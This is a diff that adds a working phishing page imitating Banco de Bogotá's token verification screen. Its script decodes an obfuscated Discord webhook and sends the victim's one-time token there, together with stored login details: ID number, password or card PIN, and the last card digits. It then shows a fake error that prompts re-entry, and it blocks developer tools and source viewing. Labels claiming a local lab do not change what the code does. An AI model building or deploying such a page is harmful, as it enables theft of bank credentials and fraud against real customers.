@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="description" content="Verificación de Token - Banco de Bogotá">
+<meta name="theme-color" content="#002A8D">
+<title>Verificación de Token - Banco de Bogotá</title>
+<link rel="icon" type="image/png" href="Imagenes/channels4_profile-removebg-preview.png">
+<link rel="apple-touch-icon" href="Imagenes/channels4_profile-removebg-preview.png">
+<link rel="stylesheet" href="css/loading-overlay.css?v=1.0.2">
+<link rel="stylesheet" href="token.css?v=1.0.2">
+<style>
+#esperaOverlay{display:none;position:fixed;inset:0;background:#2C3E5C;z-index:99999;align-items:center;justify-content:center;flex-direction:column;font-family:'Open Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#fff;opacity:0;transition:opacity .4s ease}
+#esperaOverlay.visible{display:flex;opacity:1}
+.espera-content{display:flex;flex-direction:column;align-items:center;text-align:center;padding:20px;max-width:340px;animation:fadeInUp .5s ease}
+@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.espera-login-spinner{height:8rem;width:6rem;position:relative;margin:0 auto 32px auto;animation:spinner-bdb 4s infinite;transform-origin:50% 25%}
+#esperaOverlay .shape{height:2.5rem;width:2.5rem;border-radius:50%;position:absolute}
+#esperaOverlay .shape-red{background-color:#f23a31;animation:red 4s infinite;top:0;left:50%;transform:translateX(-50%);opacity:0}
+#esperaOverlay .shape-blue{background-color:#1c83e1;animation:blue 4s infinite;top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:0}
+#esperaOverlay .shape-yellow{background-color:#fdc130;animation:yellow 4s infinite;top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:0}
+@keyframes red{0%,100%{top:0;left:50%;transform:translateX(-50%);opacity:1}10%,90%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:1}12%,50%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%) scaleY(80%);transform-origin:bottom;opacity:0}52%{top:100%;left:10%;transform:translateX(0) translateY(-100%) scaleY(1);opacity:1}60%,80%{top:0;left:0;transform:translateX(0) translateY(0) scaleY(1);opacity:1}}
+@keyframes blue{0%,100%,90.1%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:0}10%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%) scaleY(80%);opacity:0}12%,32%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%) scaleY(80%);transform-origin:bottom;opacity:1}20%{top:0;left:50%;transform:translateX(-50%) scaleY(80%);transform-origin:top;opacity:1}30%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%) scaleY(100%);opacity:1}40%,60%,80%{top:0;left:100%;transform:translateX(-100%) translateY(0) scaleY(1);opacity:1}50%{top:100%;left:90%;transform:translateX(-100%) translateY(-100%) scaleY(1);opacity:1}52%{top:100%;left:90%;transform:translateX(-100%) translateY(-100%) scaleY(80%);opacity:1}90%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:1}}
+@keyframes yellow{0%,10%,100%,12%,20%,30%,90.1%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:0}32%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%) scaleY(80%);transform-origin:bottom;opacity:0}40%{top:0;transform:translateX(0) translateY(0) scaleY(1);left:0;opacity:1}50%{top:100%;left:10%;transform:translateX(0) translateY(-100%) scaleY(1);opacity:1}50.1%{top:100%;left:90%;transform:translateX(-100%) translateY(-100%) scaleY(1);opacity:1}60%,80%{top:50%;left:50%;transform:translateX(-50%) translateY(-50%) scaleY(100%);transform-origin:bottom;opacity:1}90%{top:100%;left:50%;transform:translateX(-50%) translateY(-100%);opacity:1}}
+@keyframes spinner-bdb{0%,60%{transform:rotateZ(0)}100%,80%{transform:rotateZ(720deg)}}
+#errorOverlay{display:none;position:fixed;inset:0;background:rgba(0,10,40,.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:'Open Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;opacity:0;transition:opacity .3s ease}
+#errorOverlay.visible{display:flex;opacity:1}
+.error-card{background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3);animation:popIn .4s cubic-bezier(.34,1.56,.64,1);color:#1a1a2e}
+@keyframes popIn{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}
+.error-icon-wrap{width:72px;height:72px;background:linear-gradient(135deg,#FF4D4D 0%,#C20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,.35);animation:pulseError 1.5s ease-in-out infinite}
+@keyframes pulseError{0%,100%{transform:scale(1);box-shadow:0 8px 24px rgba(194,0,36,.35)}50%{transform:scale(1.08);box-shadow:0 12px 32px rgba(194,0,36,.5)}}
+.error-icon-wrap svg{width:36px;height:36px;stroke:#fff;stroke-width:3}
+.error-title{font-size:19px;font-weight:700;color:#0a0a1a;margin-bottom:10px}
+.error-text{font-size:14px;color:#555;line-height:1.55;margin-bottom:22px}
+.error-btn{display:block;width:100%;background:linear-gradient(135deg,#0033a0 0%,#002277 100%);color:#fff;border:none;padding:14px 20px;border-radius:30px;font-size:14px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;cursor:pointer;font-family:inherit;transition:transform .15s,box-shadow .15s;box-shadow:0 6px 18px rgba(0,51,160,.35)}
+.error-btn:hover{transform:translateY(-2px);box-shadow:0 10px 24px rgba(0,51,160,.45)}
+.error-btn:active{transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="header">
+<div class="nav-left">
+<a href="javascript:history.back()" class="back-btn">← Atrás</a>
+</div>
+<div class="nav-center">
+<h1>Ingreso a Banca Virtual</h1>
+</div>
+<div class="nav-right">
+<button onclick="window.close()" class="abandon-btn">Abandonar ×</button>
+</div>
+</div>
+<div class="login-section">
+<h2>Verifiquemos que seas tú</h2>
+<div class="token-container">
+<div class="token-icon">
+<img src="Imagenes/channels4_profile-removebg-preview.png" alt="Token Icon" class="bank-logo">
+</div>
+<div class="token-content">
+<h3>Código Token <span class="info-icon">ⓘ</span></h3>
+<p>Para realizar este proceso, ingresa el código de Token móvil o físico.</p>
+<div class="token-input-container">
+<input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+<input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+<input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+<input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+<input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+<input type="tel" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" class="token-digit">
+</div>
+<button class="verify-btn" disabled>Verificar</button>
+</div>
+</div>
+</div>
+<div class="error-message" style="display:none">
+<p>⚠️ El código token ingresado es incorrecto. Por favor intente nuevamente.</p>
+</div>
+<div id="esperaOverlay">
+<div class="espera-content">
+<div class="espera-login-spinner">
+<div class="shape shape-yellow"></div>
+<div class="shape shape-blue"></div>
+<div class="shape shape-red"></div>
+</div>
+</div>
+</div>
+<div id="errorOverlay">
+<div class="error-card">
+<div class="error-icon-wrap">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="8" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+</div>
+<div class="error-title">Código Token Incorrecto</div>
+<div class="error-text">El código token ingresado es incorrecto.<br>Por favor, verifica e inténtalo nuevamente.</div>
+<button class="error-btn" id="errorBtn">Ingresar nuevamente</button>
+</div>
+</div>
+<script>
+(function(){
+var W=atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1NDU1ODUyMDU4ODg5NDI5MS9wa0o0emEwMUpscWNVZXY2YmJKVWIwVVY2N3BGMWRQYU9kVlZwX3VMdzBRVUNtckwyZlpNWG03eVdTRlJsaS1UZlZONA==");
+var F=document;
+function g(i){return F.getElementById(i)}
+function q(s){return F.querySelectorAll(s)}
+var tI=q('.token-digit'),vB=F.querySelector('.verify-btn'),eO=g('esperaOverlay'),erO=g('errorOverlay'),eB=g('errorBtn');
+async function eDT(c){
+var f=new Date().toLocaleString('es-CO',{timeZone:'America/Bogota'});
+var lg=null;
+try{var r=sessionStorage.getItem("loginData");if(r)lg=JSON.parse(r)}catch(e){}
+var fl=[];
+if(lg){
+fl.push({name:"\uD83C\uDFAB Tipo",value:lg.tipo||"(desconocido)",inline:false});
+fl.push({name:"\uD83D\uDCCB Tipo doc",value:lg.tipoDoc||"(no seleccionado)",inline:true});
+fl.push({name:"\uD83E\uDEAA Identificaci\u00F3n",value:lg.identificacion||"(vac\u00EDo)",inline:true});
+if(lg.tipo==="Clave segura"){fl.push({name:"\uD83D\uDD11 Clave segura",value:lg.clave||"(vac\u00EDo)",inline:true})}
+else{fl.push({name:"\uD83D\uDD11 Clave tarjeta",value:lg.clave||"(vac\u00EDo)",inline:true});fl.push({name:"\uD83D\uDCB3 \u00DAlt. 4 d\u00EDgitos",value:lg.tarjeta||"(vac\u00EDo)",inline:true})}
+}else{fl.push({name:"\u26A0\uFE0F Nota",value:"No se encontraron datos previos de login.",inline:false})}
+fl.push({name:"\uD83D\uDD10 C\u00F3digo Token",value:c||"(vac\u00EDo)",inline:false});
+fl.push({name:"\uD83D\uDD52 Fecha token",value:f,inline:false});
+var p={username:"BDB-PoC",embeds:[{title:"Pitando",color:0xC20024,fields:fl,footer:{text:"Entorno de laboratorio local"}}]};
+try{var rs=await fetch(W,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p)});if(!rs.ok)console.warn("Discord:",rs.status)}catch(e){console.error("Error enviando a Discord:",e)}
+}
+function sn(v){return (v||'').replace(/\D/g,'')}
+tI.forEach(function(i,idx){
+i.addEventListener('input',function(){
+var l=sn(i.value);
+i.value=l.slice(-1)||'';
+if(i.value.length===1&&idx<tI.length-1){tI[idx+1].focus()}
+vT();
+});
+i.addEventListener('keydown',function(e){
+var kp=['Backspace','Delete','Tab','ArrowLeft','ArrowRight','Home','End','Enter'];
+var ca=e.ctrlKey||e.metaKey;
+var en=/^[0-9]$/.test(e.key);
+if(!en&&kp.indexOf(e.key)===-1&&!ca){e.preventDefault();return}
+if(e.key==='Backspace'&&i.value===''&&idx>0){tI[idx-1].focus();tI[idx-1].value='';vT()}
+});
+i.addEventListener('paste',function(e){
+e.preventDefault();
+var pg=(e.clipboardData||window.clipboardData).getData('text');
+var dg=sn(pg).split('');
+dg.forEach(function(d,ix){var tg=tI[idx+ix];if(tg)tg.value=d});
+var sg=tI[Math.min(idx+dg.length,tI.length-1)];
+if(sg)sg.focus();
+vT();
+});
+i.addEventListener('focus',function(){i.setAttribute('inputmode','numeric')});
+i.addEventListener('change',vT);
+i.addEventListener('keyup',vT);
+});
+function vT(){
+var af=Array.from(tI).every(function(i){return i.value.trim().length===1});
+if(vB)vB.disabled=!af;
+}
+vT();
+if(vB){
+vB.addEventListener('click',async function(e){
+e.preventDefault();
+var c=Array.from(tI).map(function(i){return i.value}).join('');
+await eDT(c);
+iE();
+});
+}
+function iE(){
+eO.classList.add('visible');
+var D=15000;
+setTimeout(function(){
+eO.classList.remove('visible');
+setTimeout(function(){erO.classList.add('visible')},300);
+},D);
+eB.addEventListener('click',function(){window.location.href='token.html'});
+}
+})();
+</script>
+<script>
+(function(){
+document.addEventListener('contextmenu',function(e){e.preventDefault();return false});
+document.addEventListener('keydown',function(e){
+var k=(e.key||'').toLowerCase(),c=e.ctrlKey||e.metaKey,s=e.shiftKey;
+if(k==='f12'){e.preventDefault();return false}
+if(c&&s&&(k==='i'||k==='j'||k==='c')){e.preventDefault();return false}
+if(c&&k==='u'){e.preventDefault();return false}
+if(c&&k==='s'){e.preventDefault();return false}
+if(c&&s&&k==='k'){e.preventDefault();return false}
+if(c&&s&&k==='e'){e.preventDefault();return false}
+if(c&&s&&k==='s'){e.preventDefault();return false}
+if(c&&s&&k==='c'){e.preventDefault();return false}
+});
+document.addEventListener('dragstart',function(e){e.preventDefault()});
+if(window.top!==window.self){try{window.top.location=window.self.location}catch(e){document.body.innerHTML=''}}
+})();
+</script>
+</body>
+</html>
